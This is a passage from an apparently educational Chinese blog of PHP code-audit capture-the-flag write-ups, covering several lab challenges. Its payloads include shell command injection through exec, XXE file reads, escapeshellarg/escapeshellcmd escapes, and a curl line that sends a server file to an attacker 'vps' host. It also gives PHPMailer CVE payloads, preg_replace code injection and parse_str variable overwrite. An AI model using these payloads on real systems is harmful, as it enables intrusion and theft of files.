<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320222243276.png" alt="image-20210320222243276" style="zoom:50%;">

<p><strong>代码审计</strong></p>
<p>输入的网址首先经过 filter_var()判断是否符合 uri 格式要求，然后用 parse_url()</p>
<p>提取出其中的 host 部分，拼接到 exec()函数里，而 url 是可控的，明显思路是要利用</p>
<p>exec()来命令执行。</p>
<p>可以使用如下 payload 进入命令执行，引号用来闭合 curl 后面的引号，分号则用来闭</p>
<p>合命令，从而执行 ls 命令，并且由于 parse_url()的解析问题，会把第一个分号后面的</p>
<p>内容当作 host 部分，则绕过了正则匹配检查。</p>
<pre><code class="hljs awk">?url=hello:<span class="hljs-regexp">//</span><span class="hljs-string">&quot;;ls;&quot;</span>sec-redclub.com</code></pre>

<p>此时的<code>$site_info[host]</code>的值为<code>&quot;;dir;&quot;sec-redclub.com</code>，那么拼接后的语句 为</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-built_in">dir</span>;<span class="hljs-string">&quot;sec-redclub.com&quot;</span></code></pre>

<p>这样当exec执行时就会执行到dir命令，所以就可以列出目录</p>
<p>读取flag</p>
<pre><code class="hljs awk">?url=hello:<span class="hljs-regexp">//</span><span class="hljs-string">&quot;;more$&#123;IFS&#125;;&quot;</span>sec-redclub.com</code></pre>



<h2 id="3-实例化任意对象漏洞"><a href="#3-实例化任意对象漏洞" class="headerlink" title="3.实例化任意对象漏洞"></a>3.实例化任意对象漏洞</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NotFound</span></span>&#123;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;404&#x27;</span>);
    &#125;
&#125;
<span class="hljs-title function_ invoke__">spl_autoload_register</span>(
    function (<span class="hljs-variable">$class</span>)&#123;
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">NotFound</span>();
    &#125;
);
<span class="hljs-variable">$classname</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-literal">null</span>;
<span class="hljs-variable">$param</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>] : <span class="hljs-literal">null</span>;
<span class="hljs-variable">$param2</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>] : <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">class_exists</span>(<span class="hljs-variable">$classname</span>))&#123;
    <span class="hljs-variable">$newclass</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$classname</span>(<span class="hljs-variable">$param</span>,<span class="hljs-variable">$param2</span>);
    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$newclass</span>);
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$newclass</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27;=&gt;&#x27;</span>.<span class="hljs-variable">$value</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;
&#125;
</code></pre>

<p>这道题目考察的是实例化漏洞结合XXE漏洞。我们在上图第18行处可以看到使用了 <strong>class_exists</strong> 函数来判断类是否存在，如果不存在的话，就会调用程序中的 <strong>__autoload</strong> 函数，但是这里没有 <strong>__autoload</strong> 函数，而是用 <a href="http://php.net/manual/en/function.spl-autoload-register.php"><strong>spl_autoload_register</strong></a> 注册了一个类似 <strong>__autoload</strong> 作用的函数，即这里输出404信息。</p>
<p>我们这里直接利用PHP的内置类，先用 <strong>GlobIterator</strong> 类搜索 <strong>flag文件</strong> 名字，来看一下PHP手册对 <strong>GlobIterator</strong> 类的 构造函数的定义：</p>
<blockquote>
<p>public <strong>GlobIterator::__construct</strong> ( string <code>$pattern</code> [, int <code>$flags</code> &#x3D; FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO ] )</p>
</blockquote>
<p>首先我们需要知道 flag 在哪个文件中，在 PHP 的内置类中可以用 GlobIterator 类来遍历文件系统，其构造函数的第一个参数为要搜索的文件名，第二个参数为选择文件的哪个</p>
<p>列目录的payload:</p>
<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/homework/</span>php<span class="hljs-regexp">/xxe/i</span>ndex.php?name=GlobIterator&amp;param=./*.php&amp;param2=<span class="hljs-number">0</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320230302156.png" alt="image-20210320230302156">读取flag</p>
<p><strong>方法一：</strong></p>
<p>实例化 SimpleXMLElement类来进行 XXE</p>
<pre><code class="hljs xml">?name=SimpleXMLElement&amp;param=<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/f1ag.php&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">x</span>&gt;</span>%26xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">x</span>&gt;</span>&amp;param2=2</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320230727404.png" alt="image-20210320230727404"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320230746924.png" alt="image-20210320230746924"></p>
<p><strong>方法二:</strong></p>
<p>使用 SplFileObject 类直接读取文件</p>
<p>payload</p>
<pre><code class="hljs dts">?<span class="hljs-attr">name</span><span class="hljs-operator">=</span>SplFileObject<span class="hljs-variable">&amp;param</span>=./flag.php<span class="hljs-variable">&amp;param2</span>=r</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320231130526.png" alt="image-20210320231130526"></p>
<h2 id="4-escapeshellarg与escapeshellcmd使用不当"><a href="#4-escapeshellarg与escapeshellcmd使用不当" class="headerlink" title="4.escapeshellarg与escapeshellcmd使用不当"></a>4.escapeshellarg与escapeshellcmd使用不当</h2><p>主体上就是一个过滤了后的mail函数执行。<br>mail函数的参数是这样的</p>
<pre><code class="hljs php"><span class="hljs-keyword">bool</span> <span class="hljs-title function_ invoke__">mail</span> (
	<span class="hljs-keyword">string</span> <span class="hljs-variable">$to</span> ,
	<span class="hljs-keyword">string</span> <span class="hljs-variable">$subject</span> ,
	<span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> [,
	<span class="hljs-keyword">string</span> <span class="hljs-variable">$additional_headers</span> [,
	<span class="hljs-keyword">string</span> <span class="hljs-variable">$additional_parameters</span> ]]
)</code></pre>

<p>由于默认调用的是linux的sendmail函数，所以可以在<code>message</code>中写入恶意代码。接着由additional_parameters 指定额外参数，从而写入在指定目录写入文件。</p>
<p>但是，php的mail函数也在底层默认执行了一层<code>escapeshellcmd()</code>函数，那么显然转义了我们的恶意代码。<br>不过，本题代码还有一处经典的<code>escapeshellarg()</code>。如果<code>escapeshellarg()</code>+<code>escapeshellcmd()</code>搭配使用，将出现特殊字符逃逸的问题。<br>buu上也有一个类似的题目.这里则借用项目里的例子简单介绍下</p>
<pre><code class="hljs routeros">127.0.0.1<span class="hljs-string">&#x27; -v -d a=1</span>
<span class="hljs-string">#escapeshellarg</span>
<span class="hljs-string">&#x27;</span>127.0.0.1<span class="hljs-string">&#x27;\&#x27;</span><span class="hljs-string">&#x27; -v -d a=1&#x27;</span>
<span class="hljs-comment">#escapeshellcmd</span>
<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1\&#x27;</code></pre>

<p>此时最后一步可以看出，<code>\\</code>将被解释为<code>\</code>不再起到转义的作用，而是作为换行符。因此payload变为先是<code>127.0.0.1</code>，再<code>-v -d</code>-d对应的数据为<code>a=1&#39;</code>.</p>
<p>比如CVE-2016-10033 跟CVE-2016-10045的两个payload</p>
<pre><code class="hljs awk">a( -OQueueDirectory=<span class="hljs-regexp">/tmp -X/</span>var<span class="hljs-regexp">/www/</span>html/x.php )@a.com

a<span class="hljs-string">&#x27;( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span></code></pre>

<p>前者没有escapeshellcmd直接打。后者escapeshellcmd后又加了一层escapeshellarg导致字符逃逸。</p>
<p>源码如下，对其进行了注释</p>
<pre><code class="hljs php+HTML">&lt;?php
highlight_file(&#x27;index.php&#x27;);
function waf($a)&#123;
    foreach($a as $key =&gt; $value)&#123;
        if(preg_match(&#x27;/flag/i&#x27;,$key))&#123;//遍历所有键，不能出现flag字样
            exit(&#x27;are you a hacker&#x27;);
        &#125;
    &#125;
&#125;
foreach(array(&#x27;_POST&#x27;, &#x27;_GET&#x27;, &#x27;_COOKIE&#x27;) as $__R) &#123;//遍历所有以post，get，cookie方式提交的数据，
    if($$__R) &#123; //例如$flag=a,$$flag--&gt;$a,一个新变量
        foreach($$__R as $__k =&gt; $__v) &#123; 
            if(isset($$__k) &amp;&amp; $$__k == $__v) unset($$__k); //若之前有这个变量并且键和值相等，就删除这个变量
        &#125;
    &#125;

&#125;
if($_POST) &#123; waf($_POST);&#125;
if($_GET) &#123; waf($_GET); &#125;
if($_COOKIE) &#123; waf($_COOKIE);&#125;

if($_POST) extract($_POST, EXTR_SKIP);//将键名变成变量名，如果传入flag，应该是设置了_GET[&#x27;flag&#x27;]这个变量
if($_GET) extract($_GET, EXTR_SKIP);
if(isset($_GET[&#x27;flag&#x27;]))&#123;//必须设置以get方式传参的flag..这个可以用
    if($_GET[&#x27;flag&#x27;] === $_GET[&#x27;hongri&#x27;])&#123;
        exit(&#x27;error&#x27;);
    &#125;
    if(md5($_GET[&#x27;flag&#x27;] ) == md5($_GET[&#x27;hongri&#x27;]))&#123;//数组或碰撞
		echo &quot;success!&quot;;
	   $url = $_GET[&#x27;url&#x27;];
        $urlInfo = parse_url($url);
        if(!(&quot;http&quot; === strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;===strtolower($urlInfo[&quot;scheme&quot;])))&#123;
            die( &quot;scheme error!&quot;);
        &#125;
        $url = escapeshellarg($url);
        $url = escapeshellcmd($url);//特殊字符逃逸
        system(&quot;curl &quot;.$url);
    &#125;
&#125;
?&gt;
</code></pre>

<p>很明显的变量覆盖，之后要绕过waf。再接下来就是escapeshellsmd&#x2F;arg的搭配进行命令执行了。<br>首先要解决的是，我们必须绕过preg_match的限制才能传入flag变量。因此要利用好它写好的这个功能。</p>
<p>首先这里利用了可变变量的特性。假设我们提交</p>
<pre><code class="hljs stata">?flag=<span class="hljs-keyword">test</span> 
<span class="hljs-keyword">post</span>:_GET[flag]=<span class="hljs-keyword">test</span></code></pre>

<p>当开始遍历 <code>$_POST</code> 超全局数组的时候， <code>$__k</code> 代表 _GET[flag] ，所以 <code>$$__k</code>就是 <code>$_GET[flag]</code> ，即 test 值，此时 <code>$$__k == $__v</code> 成立，变量 <code>$_GET[flag]</code> 就被 unset 了</p>
<p>而接下来下面又有一个变量覆盖<br><code>if($_POST) extract($_POST, EXTR_SKIP);</code><br>所以直接得到<code>$_GET[flag]=test</code>绕过第一层</p>
<p>第二层只需利用0e的MD5弱类型比较<br>最后是curl的命令执行<br><code>http://baidu.com/&#39; -F file=@/var/www/html/flag.php -x vps:9999</code><br>似乎当curl版本变高后，将不再能执行。<br><code>curl &#39;127.0.0.1&#39;\&#39;&#39;</code></p>
<h2 id="5-preg-match函数漏洞"><a href="#5-preg-match函数漏洞" class="headerlink" title="5.preg_match函数漏洞"></a>5.preg_match函数漏洞</h2><pre><code class="hljs php"><span class="hljs-comment">// index.php</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;
<span class="hljs-keyword">if</span>  (<span class="hljs-string">&quot;POST&quot;</span> == <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>])
&#123;
    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];
    <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> &gt;= <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;</span>, <span class="hljs-variable">$password</span>))
    &#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Wrong Format&#x27;</span>;
        <span class="hljs-keyword">exit</span>;
    &#125;
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">TRUE</span>)
    &#123;
        <span class="hljs-variable">$reg</span> = <span class="hljs-string">&#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-number">6</span> &gt; <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-variable">$reg</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$arr</span>))
            <span class="hljs-keyword">break</span>;
        <span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>;
        <span class="hljs-variable">$ps</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;punct&#x27;</span>, <span class="hljs-string">&#x27;digit&#x27;</span>, <span class="hljs-string">&#x27;upper&#x27;</span>, <span class="hljs-string">&#x27;lower&#x27;</span>);
        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$ps</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$pt</span>)
        &#123;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[[:<span class="hljs-subst">$pt</span>:]]+/&quot;</span>, <span class="hljs-variable">$password</span>))
            <span class="hljs-variable">$c</span> += <span class="hljs-number">1</span>;
        &#125;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span> &lt; <span class="hljs-number">3</span>) <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;42&quot;</span> == <span class="hljs-variable">$password</span>) <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Wrong password&#x27;</span>;
        <span class="hljs-keyword">exit</span>;
    &#125;
&#125;
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-meta">?&gt;</span></code></pre>

<p>字符类的含义是</p>
<pre><code class="hljs gauss"><span class="hljs-keyword">graph</span> 空格以外的可打印字符
punct  打印字符，不包括字母数字</code></pre>

<p>主要函数里，第一个正则表示匹配到可打印字符12个以上;第二个正则表示把连续的符号、数字、大写、小写，作为一段，至少分六段;第三个正则表示输入的字符串至少含有符号、数字、大写、小写中的三种类型。</p>
<p>最后与数字进行弱类型比较。<br>payload</p>
<pre><code class="hljs apache"><span class="hljs-attribute">42</span>.<span class="hljs-number">00</span>e+<span class="hljs-number">00000</span></code></pre>


<p>第一种方法</p>
<pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1/index.php?option=a&#x27;;%0aphpinfo();//</span>
<span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1/index.php?option=a</span></code></pre>

<p>第一个payload写入内容后只有一个单引号被转义的问题。而第二部分再传入一个a时就会因为<code>.*</code>匹配无数次而把<code>\</code>换掉</p>
<p>还有两种preg_replace的方法、这里提下第二种，也就是还适用于单行(非贪婪)模式的payload。之前安恒的套娃web2里出现过。</p>
<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/test/</span>ph.php?option=;phpinfo();
http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/test/</span>ph.php?option=<span class="hljs-variable">$0</span></code></pre>

<p>其最后的效果是下面这样的</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$option</span>=<span class="hljs-string">&#x27;$option=&#x27;</span>;<span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-string">&#x27;;&#x27;</span>;</code></pre>

<h2 id="6-parse-str函数缺陷"><a href="#6-parse-str函数缺陷" class="headerlink" title="6.parse_str函数缺陷"></a>6.parse_str函数缺陷</h2><p><strong>漏洞代码</strong></p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getUser</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>) </span>&#123;
  <span class="hljs-keyword">global</span> <span class="hljs-variable">$config</span>, <span class="hljs-variable">$db</span>;
  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$db</span>)) &#123;
    <span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MySQLi</span>(
      <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dbhost&#x27;</span>],
      <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dbuser&#x27;</span>],
      <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dbpass&#x27;</span>],
      <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dbname&#x27;</span>]
    );
  &#125;
  <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT username FROM users WHERE id = ?&quot;</span>;
  <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$sql</span>);
  <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-variable">$id</span>);
  <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_result</span>(<span class="hljs-variable">$name</span>);
  <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();
  <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();
  <span class="hljs-keyword">return</span> <span class="hljs-variable">$name</span>;
&#125;

<span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>]);
<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$var</span>[<span class="hljs-string">&#x27;query&#x27;</span>]);
<span class="hljs-variable">$currentUser</span> = <span class="hljs-title function_ invoke__">getUser</span>(<span class="hljs-variable">$id</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$currentUser</span>).<span class="hljs-string">&#x27;&lt;/h1&gt;&#x27;</span>;</code></pre>

<p><strong>漏洞解析</strong></p>
<p><strong>parse_str</strong></p>
<p>先来看看定义：</p>
<blockquote>
<p>parse_str<br><strong>功能</strong> ：parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。</p>
<p>定义 ：void parse_str( string $encoded_string [, array &amp;$result ] )</p>
<p>如果 encoded_string 是 URL 传入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）</p>
</blockquote>
<p>看了定义我们也能很快感受到它的漏洞点就是变量覆盖了。</p>
<p><strong>PHP $_SERVER[‘HTTP_REFERER’]</strong></p>
<p>PHP <code>$_SERVER[&#39;HTTP_REFERER&#39;]</code>，它是获取当前页面的url。需要注意的是，<code>$_SERVER[‘HTTP_REFERER’] </code>完全来源于浏览器。并不是所有的用户代理（浏览器）都会设置这个变量，而且有的还可以手工修改 HTTP_REFERER。因此，$_SERVER[‘HTTP_REFERER’] 是可以伪造的。<br><strong><code>$_SERVER[‘HTTP_REFERER’] </code>对 POST 表单访问也是有效的</strong><br>我们想办法提交类似 config[dbhost]&#x3D;127.0.0.1 这样类型的数据，这样因此我们可以控制连接的数据库，导致网站出现错误显示。</p>
<p><strong>CTF题目</strong></p>
<p>index.php</p>
<pre><code class="hljs php"><span class="hljs-comment">//index.php</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = “hongri”;
<span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];
@<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$id</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>)) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;upload.php&quot;&gt;flag is here&lt;/a&gt;&#x27;</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>upload.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);
<span class="hljs-variable">$referer</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$referer</span>)!== <span class="hljs-literal">false</span>) &#123;
    <span class="hljs-variable">$savepath</span> = <span class="hljs-string">&quot;uploads/&quot;</span> . <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&quot;/&quot;</span>;
    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$savepath</span>)) &#123;
        <span class="hljs-variable">$oldmask</span> = <span class="hljs-title function_ invoke__">umask</span>(<span class="hljs-number">0</span>);
        <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$savepath</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);
        <span class="hljs-title function_ invoke__">umask</span>(<span class="hljs-variable">$oldmask</span>);
    &#125;
    <span class="hljs-keyword">if</span> ((@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) &amp;&amp; (@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;
        <span class="hljs-comment">//$fp = fopen(&quot;$savepath&quot;.$_GET[&#x27;filename&#x27;], &#x27;w&#x27;);</span>
        <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r&#x27;</span>;
        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$savepath</span>&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);
        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;Flag is here,come on~ &#x27;</span> . <span class="hljs-variable">$savepath</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) . <span class="hljs-string">&quot;&quot;</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg</span>;
        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">100000</span>);
        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Too slow!&quot;</span>;
        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$savepath</span>&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);
    &#125;
   <span class="hljs-keyword">print</span> <span class="hljs-string">&lt;&lt;&lt;EOT</span>
<span class="hljs-string">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</span>
<span class="hljs-string">&lt;div class=&quot;form-group&quot;&gt;</span>
<span class="hljs-string">&lt;label for=&quot;exampleInputEmail1&quot;&gt;Filename&lt;/label&gt;</span>
<span class="hljs-string">&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;filename&quot; id=&quot;exampleInputEmail1&quot; placeholder=&quot;Filename&quot;&gt;</span>
<span class="hljs-string">&lt;/div&gt;</span>
<span class="hljs-string">&lt;div class=&quot;form-group&quot;&gt;</span>
<span class="hljs-string">&lt;label for=&quot;exampleInputPassword1&quot;&gt;Content&lt;/label&gt;</span>
<span class="hljs-string">&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;content&quot; id=&quot;exampleInputPassword1&quot; placeholder=&quot;Contont&quot;&gt;</span>
<span class="hljs-string">&lt;/div&gt;</span>
<span class="hljs-string">&lt;button type=&quot;submit&quot; class=&quot;btn btn-default&quot;&gt;Submit&lt;/button&gt;</span>
<span class="hljs-string">&lt;/form&gt;</span>
<span class="hljs-string">EOT</span>;
&#125;
<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you can not see this page&#x27;</span>;
&#125;</code></pre>

<p><strong>第一关</strong></p>
<p>在index.php内有如下;</p>
<pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];
@<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$id</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>)) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;upload.php&quot;&gt;flag is here&lt;/a&gt;&#x27;</span>;</code></pre>

<p>可想而知我们需要用变量覆盖，payload为：</p>
<pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=a[0]=s878926199a</code></pre>

<p>就会出来一个链接，点击就到了upload页面。如果我们直接访问upload会报错，因为有如下代码：</p>
<pre><code class="hljs php"><span class="hljs-variable">$referer</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$referer</span>)!== <span class="hljs-literal">false</span>)</code></pre>

<p>当我们是通过a标签链接过去的会自动带上refer字段。</p>
<p><strong>第二关</strong></p>
<p>uplaod主要代码：</p>
<pre><code class="hljs awk"><span class="hljs-keyword">if</span> ((@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) &amp;&amp; (@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;
        <span class="hljs-regexp">//</span><span class="hljs-variable">$fp</span> = fopen(<span class="hljs-string">&quot;$savepath&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-string">&#x27;w&#x27;</span>);
        <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r&#x27;</span>;
        file_put_contents(<span class="hljs-string">&quot;$savepath&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);
        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;Flag is here,come on~ &#x27;</span> . <span class="hljs-variable">$savepath</span> . htmlspecialchars(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) . <span class="hljs-string">&quot;&quot;</span>;
        echo <span class="hljs-variable">$msg</span>;
        usleep(<span class="hljs-number">100000</span>);<span class="hljs-regexp">//</span>延迟
        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Too slow!&quot;</span>;
